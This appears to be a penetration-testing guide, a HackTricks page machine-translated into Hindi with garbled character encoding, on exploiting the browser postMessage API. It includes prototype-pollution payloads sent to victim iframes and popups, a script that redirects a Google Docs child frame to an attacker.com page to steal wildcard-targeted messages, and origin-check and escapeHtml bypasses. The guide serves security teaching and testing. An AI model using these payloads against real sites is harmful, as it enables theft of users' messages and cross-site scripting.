# PostMessage рд╡рд┐рдХрд▓реНрдк

## PostMessage рд╡рд┐рдХрд▓реНрдк

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЕрдирдиреНрдп [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## **PostMessage** рднреЗрдЬреЗрдВ

**PostMessage** рдПрдХ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **targetOrigin** рдПрдХ '\*' рдпрд╛ _https://company.com_ рдЬреИрд╕реА URL рд╣реЛ рд╕рдХрддреА рд╣реИред\
**рджреВрд╕рд░реЗ рд╕реНрдерд┐рддрд┐** рдореЗрдВ, **рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ рдЙрд╕ рдбреЛрдореЗрди рдХреЛ рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рдпрджрд┐ рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдореВрд▓ рдЙрддреНрдкрддреНрддрд┐ рднрд┐рдиреНрди рд╣реЛ рднреА)ред\
рдпрджрд┐ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╕рдВрджреЗрд╢ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдХреЛ рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**, рдФрд░ рдпрд╣ рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдореВрд▓ рдЙрддреНрдкрддреНрддрд┐ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

### **targetOrigin** рдореЗрдВ iframe рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЛ рд╣рдорд▓рд╛

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдкреГрд╖реНрда рдорд┐рд▓рддрд╛ рд╣реИ рдЬреЛ **рдЖрдИрдлреНрд░реЗрдо** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдХреЛрдИ `X-Frame-Header` рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЬреЛ рдПрдХ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** (\*) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рдВрджреЗрд╢ **postMessage** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдЖрдИрдлреНрд░реЗрдо** рдХреЗ **рдореВрд▓** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдХреЗ рдЙрд╕ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рдВрджреЗрд╢ рдХреЛ рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдбреЛрдореЗрди рдХреЛ **рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдкреГрд╖реНрда рдХреЛ рдЖрдИрдлреНрд░реЗрдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **targetOrigin** рдПрдХ URL рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдкрд░ рдирд╣реАрдВ, рддреЛ рдпрд╣ **рдЪрд╛рд▓** рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреАред
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener рд╢реЛрд╖рдг

**`addEventListener`** рд╡рд╣ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕реЗ JS рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдХреА рдШреЛрд╖рдгрд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ `postMessages` рдХреА рдЖрд╢рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рдорд╛рди рдПрдХ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЛрдб рдХрд╛ **рдкрд╣рд▓рд╛ рдХрд╛рдо** рд╣реИ **рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛**ред рдпрд╣ рдмрд╣реБрдд **рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ**, рдЦрд╛рд╕рдХрд░ рдЬрдм рдкреГрд╖реНрда рдкреНрд░рд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдХреБрдЫ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрдп** рдХрд░рдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реЛрддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдирд╛)ред **рдпрджрд┐ рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдЗрдВрддрдХрд╛рд▓ рдкрд░ рдЕрдирд┐рдпрдорд┐рдд рдбреЗрдЯрд╛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдкреАрдбрд╝рд┐рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ)ред

### рдЧрдгрдирд╛

рд╡рд░реНрддрдорд╛рди рдкреГрд╖реНрда рдореЗрдВ **рдЗрд╡реЗрдВрдЯ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ** рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **JS рдХреЛрдб** рдореЗрдВ `window.addEventListener` рдФрд░ `$(window).on` (_JQuery version_) рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ
* рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдХрдВрд╕реЛрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░реЗрдВ: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдореЗрдВ _Elements --> Event Listeners_ рдкрд░ рдЬрд╛рдПрдВ

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) рдпрд╛ [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) рдЬреИрд╕реЗ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдпреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди **рд╕рднреА рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░реЗрдВрдЧреЗ** рдФрд░ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рджрд┐рдЦрд╛рдПрдВрдЧреЗред

### рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рдмреЗрд╕рд┐рдХ рдмрд╛рдИрдкрд╛рд╕

* рдпрджрд┐ **`indexOf()`** рдХрд╛ рдЙрдкрдпреЛрдЧ PostMessage рдЗрд╡реЗрдВрдЯ рдХреЗ рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ: `("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")`\\
* рдпрджрд┐ **`search()`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред `String.prototype.search()` рдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рдирд┐рдпрдорд┐рдд рд╡рд┐рд░реЛрдзреА рд╡рд╕реНрддреБ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреА рд╣реИ рдмрдЬрд╛рдп рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗред рдпрджрд┐ рдЗрд╕рд╕реЗ рд░реЗрдЧреБрд▓рд░ рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреБрдЫ рднреА рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реНрд╡рддрдГ рд░реЗрдЧреБрд▓рд░ рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рдореЗрдВ рдмрджрд▓ рдЬрд╛рдПрдЧрд╛ред\
рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдореЗрдВ, **рдбреЙрдЯ (.) рдХреЛ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдирд╛рдо рдХреЗ рдмрдЬрд╛рдп рдПрдХ **рд╡рд┐рд╢реЗрд╖ рдбреЛрдореЗрди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ: `"https://www.safedomain.com".search("www.s.fedomain.com")`ред\\
* рдпрджрд┐ **`escapeHtml`** рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдПрдХ `new` рдПрд╕реНрдХреЗрдкреНрдб рдСрдмреНрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ рдореМрдЬреВрджрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдпрджрд┐ рд╣рдореЗрдВ рдПрдХ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕рдВрдкрддреНрддрд┐ рд╡рд╛рд▓рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ `hasOwnProperty` рдХрд╛ рдЙрддреНрддрд░ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрд╕реНрдХреЗрдкреНрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛ред
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
`File` рдСрдмреНрдЬреЗрдХреНрдЯ рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд▓рд┐рдП рд╕рд╣реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдПрдХ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп `name` рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реЛрддреА рд╣реИ рдЬреЛ рд╣рдорд╛рд░реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ `escapeHtml` рдлрдВрдХреНрд╢рди рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рджреЗрдЧреАред

### e.origin == window.origin рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛

рдЬрдм рдПрдХ рдкреЗрдЬ `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдЖрдЗрдлреНрд░реЗрдо** рдореЗрдВ рдПрдореНрдмреЗрдб рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕ **рдЖрдЗрдлреНрд░реЗрдо** рдХреА **рдЙрддреНрдкрддреНрддрд┐** **`null`** рд╣реЛрдЧреАред

рдЬрдм **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдорд╛рди `allow-popups` рд╕реЗрдЯ** рд╣реЛрддрд╛ рд╣реИ рддреЛ **рдЦреЛрд▓реЗ рдЧрдП рдкреЙрдкрдЕрдк** рдХреЛ **рд╕рднреА рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рдЕрдиреБрд░реЛрдзрд┐рдд** рдХрд░реЗрдВрдЧреА рдЬрдм рддрдХ `allow-popups-to-escape-sandbox` рд╕реЗрдЯ рди рд╣реЛред\
рдЗрд╕рд▓рд┐рдП, рдПрдХ **рдирд▓ рдЙрддреНрдкрддреНрддрд┐** рд╕реЗ рдПрдХ **рдкреЙрдкрдЕрдк рдЦреЛрд▓рдирд╛** рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдЕрдВрджрд░ рд╕реЗ, рдФрд░ рдлрд┐рд░ рдЖрдЗрдлреНрд░реЗрдо рд╕реЗ рдкреЙрдкрдЕрдк рдХреЛ **postMessage** рднреЗрдЬрдирд╛, рджреЛрдиреЛрдВ рдЙрддреНрдкрддреНрддрд┐рдпрд╛рдБ рдирд▓ рд╣реЛрдВрдЧреА, рдЗрд╕рд▓рд┐рдП: **`e.origin == window.origin == null`**

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкрдврд╝реЗрдВ**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛

рдЖрдк рдПрдХ **рдЖрдЗрдЯрдордлреНрд░реЗрдо** рдмрдирд╛ рдХрд░ **postMessage** рднреЗрдЬрдХрд░ рдФрд░ рддреБрд░рдВрдд рд╣реА рдЙрд╕реЗ рд╣рдЯрд╛ рджреЗрдХрд░ рд╕рдВрджреЗрд╢ рдХрд╛ **`e.source`** рдирд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкрдврд╝реЗрдВ:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header рдмрд╛рдИрдкрд╛рд╕

рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ **рдкреАрдбрд╝рд┐рдд рд╡реЗрдм рдкреЗрдЬ** рдХреЛ рдПрдХ `iframe` рдореЗрдВ рд░рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рд▓реЗрдХрд┐рди `X-Frame-Header` рдЬреИрд╕реЗ рдХреБрдЫ рд╣реЗрдбрд░ рдРрд╕рд╛ **рд╡реНрдпрд╡рд╣рд╛рд░ рд░реЛрдХ рд╕рдХрддреЗ** рд╣реИрдВред\
рдРрд╕реЗ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЖрдк рдЕрднреА рднреА рдПрдХ рдХрдо рдЫрд┐рдкреЗ рд╣реБрдП рд╣рдорд▓рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдПрдХ рдирдИ рдЯреИрдм рдЦреЛрд▓рдХрд░ рдкреАрдбрд╝рд┐рдд рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### рдореБрдЦреНрдп рдкреГрд╖реНрда рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдХреЗ рдмрдЪреНрдЪреЗ рдХреЛ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдХреА рдЪреЛрд░реА

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХреИрд╕реЗ **рдореБрдЦреНрдп рдкреГрд╖реНрда рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдХреЗ** рдбреЗрдЯрд╛ рдХреЛ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдФрд░ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ **рдмрдЪреНрдЪреЗ рдЖрдЗрдлреНрд░реЗрдо** рдХреЛ рднреЗрдЬреЗ рдЧрдП **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреЛрд╕реНрдЯрдореИрд╕реЗрдЬ рдбреЗрдЯрд╛** рдХреА рдЪреЛрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ **рдмрдЪреНрдЪреЗ рдореЗрдВ XSS рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдХреЛ **рдЪреЛрд░реА** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### рдЖрдЗрдлреНрд░реЗрдо рд╕реНрдерд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рдЪреЛрд░реА рдХрд░рдирд╛

рдпрджрд┐ рдЖрдк рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдХреЛ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рд░реВрдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ X-Frame-Header рдирд╣реАрдВ рд╣реИ рдФрд░ рдЬреЛ рдПрдХ рдФрд░ рдЖрдЗрдлреНрд░реЗрдо рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдмрдЪреНрдЪреЗ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ **рд╕реНрдерд╛рди рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╡рд╣ рдПрдХ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬреЗ рдЧрдП **рдкреЛрд╕реНрдЯрдореИрд╕реЗрдЬ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ **рд╕реНрд░реЛрдд** рдХреЛ рдЕрдкрдиреЗ рдкрд╛рд╕ рдПрдХ рдкреГрд╖реНрда **рдХрдВрдЯреНрд░реЛрд▓** рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреЗрдЬ рдХреЗ рд▓рд┐рдП **рдмрджрд▓** рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕рдВрджреЗрд╢ рдЪреЛрд░реА рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage рд╕реЗ Prototype Pollution рдФрд░/рдпрд╛ XSS

рдЬрдм `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗ рдЧрдП рдбреЗрдЯрд╛ рдХреЛ JS рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдкреГрд╖реНрда рдХреЛ рдЖрдЗрдлреНрд░реЗрдо** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рднреЗрдЬрдХрд░ **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЙрд▓реНрдпреВрд╢рди/XSS** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

